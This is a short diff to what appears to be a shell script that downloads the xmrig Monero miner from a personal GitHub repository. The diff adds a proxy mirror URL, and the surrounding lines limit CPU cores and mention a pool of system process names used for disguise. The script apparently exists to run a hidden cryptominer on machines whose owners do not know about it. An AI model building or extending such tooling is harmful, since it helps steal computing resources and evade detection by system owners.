@@ -23,6 +23,7 @@ CPU_CORES=1
 DOWNLOAD_URLS=(
     "https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
     "https://github.com/jiaran464/xmr/raw/main/xmrig",
+    "https://gh-proxy.org/https://github.com/jiaran464/xmr/raw/main/xmrig",
 )
 
 # 系统进程名池（用于伪装）
